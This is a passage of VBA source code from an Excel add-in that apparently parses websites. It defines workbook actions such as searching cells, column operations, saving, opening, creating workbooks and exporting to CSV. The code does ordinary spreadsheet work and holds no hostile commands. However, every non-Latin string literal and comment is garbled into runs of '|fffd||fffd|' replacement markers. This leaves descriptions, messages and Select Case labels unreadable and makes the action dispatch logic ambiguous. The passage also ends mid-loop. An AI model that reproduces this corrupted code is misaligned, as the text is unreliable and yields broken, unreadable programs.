            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, |fffd| |fffd|.|fffd|.)." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Set." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
            "(|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|)."
        
        .AddParameter "SearchRange", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "selection", "B2:D15"), ""
        .AddParameter "SearchMask", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd|)", Array("*", "*any text*"), "*"
        .AddParameter "Offset", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd|;|fffd||fffd||fffd||fffd||fffd||fffd|)", Array("0;0", "0;1", "1;0;5;1", "1;3", "1;-2", "-1;0;;15"), "0;0"
        .AddParameter "Action", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("GetValue", "GetHyperlink", "GetComment", "ReturnArray", "SetValue", "SetHyperlink", "SetComment", _
            "SetInteriorColor", "SetFontColor", "SetFontBold"), "GetValue"
        .AddParameter "NewValue", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "{FoundCell}", "{FoundCell.Text}", "{FoundCell.URL}", "{FoundCell.Comment}", "{FoundCell.Address}", "{FoundCell.Row}", "{TargetCell}", "{TargetCell.Text}", "{TargetCell.URL}", "{TargetCell.Comment}", "{TargetCell.Address}"), ""
        .AddParameter "TargetMask", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("*", "*any text*", ""), "*"
        .AddParameter "ReplaceBlankWith", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|", Array("", "empty!", "|fffd||fffd||fffd||fffd||fffd|"), ""
    End With
    
    With AAs.AddAction(fc_Workbook, "Column", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd|.|fffd|." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|: 1 |fffd||fffd||fffd| 2-5 |fffd||fffd||fffd| 1-2,4,6-8,10)"
        
        .AddParameter "Columns", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "2-5", "1-2,4,6-8,10"), "1"
        .AddParameter "Action", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "NewValue", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Workbook, "FindCellsOnSheet", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, " & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|; " & _
            "|fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| selection - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
            "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "What", aps_List, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("0 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "1 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "2 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "0 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "SearchRange", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "selection", "B2:D15"), ""
        .AddParameter "SearchMask", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("http*://?*.?*/?*", "http*", "?*"), "http*://?*.?*/?*"
        .AddParameter "AddCellAddress", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With
    
End Sub

Function GetArrayOfHeadersAndValues(Optional WP As WebsiteParser, Optional ByVal ColumnFrom& = 1, Optional ByVal HeaderMask$) As String
    On Error Resume Next
    Const PIPE_REPLACER$ = "~"
    If ColumnFrom& <= 0 Then ColumnFrom& = 1
    If Trim(HeaderMask$) = "" Then HeaderMask$ = "*"
    If WP Is Nothing Then Set WP = RunningParser
    
    Dim HeaderRow&, CurrentRow As Range, bmsg$
    HeaderRow& = WP.Columns.SheetOptions.HeaderRowNumber
    If HeaderRow& = 0 Then HeaderRow& = 1
    
    Set CurrentRow = WP.SourceData.ActiveItem.GetSourceRow.EntireRow
    If CurrentRow Is Nothing Then
        If WP.Options.ShowErrors Or TEST_ACTIONS_MODE Then
            bmsg$ = "<strong>|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| GetArrayOfHeadersAndValues</strong><br />" & "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            AddBalloon bmsg$, bt_Warning
        End If
        Set CurrentRow = Selection.Cells(1).EntireRow
    End If
    If CurrentRow Is Nothing Then Exit Function
    
    Dim Hrange As Range, sh As Worksheet, arrH As Variant, arrV As Variant, LastCol&, i&
    Set sh = CurrentRow.Worksheet
    LastCol& = sh.Cells(HeaderRow&, sh.Columns.Count).End(xlToLeft).Column
    If ColumnFrom& >= sh.Columns.Count Then ColumnFrom& = sh.Columns.Count - 1
    If LastCol& <= ColumnFrom& Then LastCol& = ColumnFrom& + 1
    
    Set Hrange = sh.Range(sh.Cells(HeaderRow&, ColumnFrom&), sh.Cells(HeaderRow&, LastCol&))
    arrH = Hrange.value
    arrV = Intersect(Hrange.EntireColumn, CurrentRow.EntireRow).value
    ReDim resArr(1 To UBound(arrH, 2))
    
    For i = LBound(arrH, 2) To UBound(arrH, 2)
        If arrH(1, i) Like HeaderMask$ Then
            resArr(i) = Replace(arrH(1, i), "|", PIPE_REPLACER$) & "|" & Replace(arrV(1, i), "|", PIPE_REPLACER$)
        End If
    Next i
    
    GetArrayOfHeadersAndValues = Join(resArr, ARSEP)
End Function

Sub Action_DirectOutput(ByVal txt$, ByVal RangeAddress$)
    On Error Resume Next
    Dim sh As Worksheet: Set sh = RunningParser.Sheet
    If sh Is Nothing Then Set sh = ActiveSheet
    sh.Range(RangeAddress$).FormulaR1C1 = txt
End Sub

Sub Action_SaveWorkbook(Optional ByVal FileName$, Optional CloseAfterSave As String)
    On Error Resume Next
    Dim FilePath$
    ActiveWorkbook.RemovePersonalInformation = False
    If Len(FileName$) Then
        FilePath$ = GetFilenameAndCreatePathForFile(FileName$)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        If Len(FilePath$) Then
            Application.DisplayAlerts = False
            ActiveWorkbook.SaveAs FilePath$, FileFormatByExtension(FWF.GetFileExtension(FilePath$))
            Application.DisplayAlerts = True
        Else
            ActiveWorkbook.Save
        End If
    Else
        ActiveWorkbook.Save
    End If
    If CloseAfterSave = "|fffd||fffd|" Then Action_CloseWorkbook
End Sub

Sub Action_OpenWorkbook(ByVal FileName$, Optional ByVal ReadOnly As Boolean = False)
    On Error Resume Next
    Dim WB As Workbook: Set WB = ConnectToWorkbookByFilename(FileName$)
    Set LastOpenedWB = WB
    
    If ReadOnly Then
        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    Else
        Set RunningParser.Sheet = WB.ActiveSheet
    End If
    
    If ReadOnly And Not TEST_ACTIONS_MODE Then Exit Sub
    Application.ScreenUpdating = True: DoEvents: Application.ScreenUpdating = False
End Sub

Sub Action_Column(ByVal ColumnList$, ByVal Action$, Optional ByVal NewValue$)
    On Error Resume Next
    Dim sh As Worksheet, ra As Range, RangeAddr$, ar As Range
    Set sh = ActiveSheet
    If sh Is Nothing Then Exit Sub
    
    RangeAddr$ = ColumnsStringToRangeAddress(ColumnList$)
    If RangeAddr$ = "" Then Exit Sub
    Set ra = sh.Range(RangeAddr$).EntireColumn
    If ra Is Nothing Then Exit Sub
    
    Select Case Action$
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|": ra.Delete
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": ra.Insert
        Case "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|": If NewValue$ <> "" Then ra.ColumnWidth = Val(Replace(NewValue$, ",", "."))
        Case "|fffd||fffd||fffd||fffd||fffd||fffd|": ra.Hidden = True
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|": ra.Hidden = False
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            For Each ar In ra.Areas
                ar.Group
            Next ar
        Case "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            For Each ar In ra.Areas
                ar.Ungroup
            Next ar
    End Select
End Sub


Function ConnectToWorkbookByFilename(ByVal FileName$) As Workbook
    On Error Resume Next
    Dim WB As Workbook, short_name$, AlreadyOpened As Boolean
    short_name$ = Dir(FileName$, vbNormal)
    
    For Each WB In Application.Workbooks
        If WB.Name = short_name$ Then AlreadyOpened = True: Exit For
    Next
    
    If AlreadyOpened Then
        WB.Activate
    Else
        Set WB = Workbooks.Open(FileName$, Local:=True)
        WB.RemovePersonalInformation = False
    End If
    Set ConnectToWorkbookByFilename = WB
End Function


Sub Action_CloseWorkbook(Optional Mode As String)
    On Error Resume Next
    If Mode Like "2*" Then
        LastOpenedWB.Close False
        If Not TEST_ACTIONS_MODE Then Exit Sub
    Else
        ActiveWorkbook.Close False
    End If
    
    Dim SU As Boolean: SU = Application.ScreenUpdating
    Application.ScreenUpdating = True: DoEvents: Application.ScreenUpdating = SU
End Sub

Sub Action_CreateWorkbook(ByVal FileName$, Optional ByVal TemplateName$)
    On Error Resume Next
    Dim FilePath$, WB As Workbook, sh As Worksheet, template$
    If Len(FileName$) Then FilePath$ = GetFilenameAndCreatePathForFile(FileName$)        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    
    Set WB = CreateNewWorkbook(FilePath$, TemplateName$)
    
    Set RunningParser.Sheet = WB.Worksheets(1)
    Application.ScreenUpdating = True: DoEvents: Application.ScreenUpdating = False
End Sub

Function CreateNewWorkbook(ByVal FilePath$, Optional ByVal TemplateName$) As Workbook
    On Error Resume Next
    Dim WB As Workbook, sh As Worksheet, template$
    
    If Len(TemplateName$) Then
        template$ = PARSERS_FOLDER & Trim(TemplateName$)
        If Not FileExists(template$) Then AddBalloon "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Excel:" & vbNewLine & template$, bt_Attention: template$ = ""
    End If
    
    Set WB = Workbooks.Add(IIf(Len(template$), template$, xlWBATWorksheet))
    WB.RemovePersonalInformation = False
    Set sh = WB.Worksheets(1)
    If Len(template$) = 0 Then sh.Name = DEFAULT_SHEET_NAME$
    
    If Len(FilePath$) Then
        Application.DisplayAlerts = False
        WB.SaveAs FilePath$, FileFormatByExtension(FWF.GetFileExtension(FilePath$))
        Application.DisplayAlerts = True
    End If
    Set CreateNewWorkbook = WB
End Function

Sub Action_ExportToCSV(ByVal FileName$, ByVal Encoding$, ByVal CSVOptions$, Optional ByVal WP As WebsiteParser)
    On Error Resume Next
    If WP Is Nothing Then Set WP = RunningParser
    Dim sh As Worksheet, FilePath$, param, param_name$, param_value$, dic As New Dictionary
    FilePath$ = GetFilenameAndCreatePathForFile(FileName$, "export.csv")        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| CSV
    If Trim(Encoding$) = "" Then Encoding$ = "utf-8"
    
    Set sh = ActiveSheet
    If sh Is Nothing Then
        Debug.Print "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| CSV |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        Exit Sub
    End If
    dic.CompareMode = 1        'TextCompare
    
    ' "ColumnsSeparator=;&RowsSeparator={NL}&Brackets=1&ColumnsCount=auto"
    For Each param In Split(CSVOptions$, "&")
        param_name$ = Split(param, "=", 2)(0)
        param_value$ = Split(param, "=", 2)(1)
        If Len(param_name$) Then dic.item(param_name$) = param_value$
    Next
    
    dic.item("ColumnsCount") = Val(dic.item("ColumnsCount"))
    If Val(dic.item("ColumnsCount")) = 0 Then dic.item("ColumnsCount") = sh.UsedRange.Columns.Count
    
    If dic.item("ColumnsSeparator") = "" Then dic.item("ColumnsSeparator") = ";"
    If dic.item("RowsSeparator") = "" Then dic.item("RowsSeparator") = vbNewLine
    dic.item("Brackets") = Val(dic.item("Brackets"))
    
    Dim arr, sepOld$, sepNew$, chr34$, chr2_34$, i&, j&, NeedBrakets As Boolean, txt$
    arr = sh.UsedRange.value
    
    If SHOW_PI2 Then WP.PrInd2.line3 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| CSV: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| ..."
    
    DoEvents
    sepOld$ = dic.item("ColumnsSeparator")
    sepNew$ = SeparatorReplacement(sepOld$)
    chr34$ = Chr(34): chr2_34$ = Chr(34) & Chr(34)
    
    If Val(dic.item("Brackets")) > 0 Then
        For i = LBound(arr) To UBound(arr)
            For j = LBound(arr, 2) To UBound(arr, 2)
                NeedBrakets = False
                If InStr(1, arr(i, j), chr34$) Then NeedBrakets = True: arr(i, j) = Replace(arr(i, j), chr34$, chr2_34$)
                If InStr(1, arr(i, j), " ") + InStr(1, arr(i, j), sepOld$) Then NeedBrakets = True
                If NeedBrakets Then
                    arr(i, j) = chr34$ & arr(i, j) & chr34$
                End If
            Next j
            If i Mod 500 = 0 Then DoEvents
        Next i
    Else
        For i = LBound(arr) To UBound(arr)
            For j = LBound(arr, 2) To UBound(arr, 2)
                arr(i, j) = Replace(arr(i, j), sepOld$, sepNew$)
            Next j
            If i Mod 5000 = 0 Then DoEvents
        Next i
    End If
    
    If SHOW_PI2 Then WP.PrInd2.line3 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| CSV: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| ..."
    txt$ = Arr2CSV(arr, dic.item("ColumnsSeparator"), dic.item("RowsSeparator"))
    
    Application.DisplayAlerts = False
    If Dir(FilePath$, vbNormal) <> "" Then
        If Not Workbooks(Dir(FilePath$, vbNormal)) Is Nothing Then
            Workbooks(Dir(FilePath$, vbNormal)).Close False
            SetAttr FilePath$, vbNormal
            Kill FilePath$
        End If
    End If
    Application.DisplayAlerts = True
    
    If SHOW_PI2 Then WP.PrInd2.line3 = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| CSV: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| CSV |fffd||fffd||fffd||fffd||fffd| ..."
    
    If Not SaveTextToFile(txt$, FilePath$, Encoding$) Then
        WP.SetError "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| CSV |fffd||fffd||fffd||fffd|", _
            "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| CSV |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & Encoding$ & "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| #" & _
            Err.Number & " (" & Err.Description & ")" & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| <a href=""file:///" & Replace(FilePath$, "\", "/") & """>" & Dir(FilePath$) & _
            "</a> |fffd||fffd||fffd||fffd||fffd| " & FileOrFolderSize(FileLen(FilePath$)), FilePath$
        Debug.Print Err.Description, Err.Number, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| CSV |fffd||fffd||fffd||fffd| " & vbNewLine & FileName
    End If
End Sub


Sub Action_CreateWorksheet(ByVal sheetName$, Optional ByVal FillHeaders$ = "|fffd||fffd||fffd|")
    On Error Resume Next
    Dim WB As Workbook, sh As Worksheet
    If RunningParser.Columns.FastOutputEnabled Then RunningParser.Columns.FO_SwitchToNextRow True
    
    Set WB = ActiveWorkbook
    If WB Is Nothing Then Set WB = Workbooks.Add(xlWBATWorksheet)
    
    Set sh = AddNewWorksheet(WB, sheetName$)
    
    Set RunningParser.Sheet = sh
    Application.ScreenUpdating = True: DoEvents: Application.ScreenUpdating = False
    
    Action_CreateTableHeader FillHeaders$ = "|fffd||fffd|"
End Sub

Function AddNewWorksheet(ByRef WB As Workbook, ByVal sheetName$) As Worksheet
    On Error Resume Next
    Dim sh As Worksheet, i&, CharsList$: CharsList$ = "\/*[]?:"
    
    If (WB.Worksheets.Count = 1) And (WB.Worksheets(1).Name = DEFAULT_SHEET_NAME$) And (WB.Worksheets(1).UsedRange.Address(0, 0) = "A1") Then
        Set sh = WB.Worksheets(1)
    Else
        Set sh = WB.Worksheets.Add(, WB.Worksheets(WB.Worksheets.Count))
    End If
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Const ReplaceWith$ = "_"
    For i& = 1 To Len(CharsList$)
